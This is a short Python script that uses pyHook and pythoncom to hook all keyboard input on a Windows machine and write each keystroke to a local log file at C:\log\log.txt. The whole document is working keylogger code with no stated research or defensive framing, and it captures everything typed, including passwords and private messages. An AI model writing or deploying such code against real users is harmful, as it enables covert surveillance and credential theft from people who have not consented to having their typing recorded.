import pyHook
import sys
import pythoncom
import logging

file_log = 'C:\\log\\log.txt'


def on_key_board_event(event):
    logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
    chr(event.Ascii)
    logging.log(10, chr(event.Ascii))
    return True

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = on_key_board_event
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()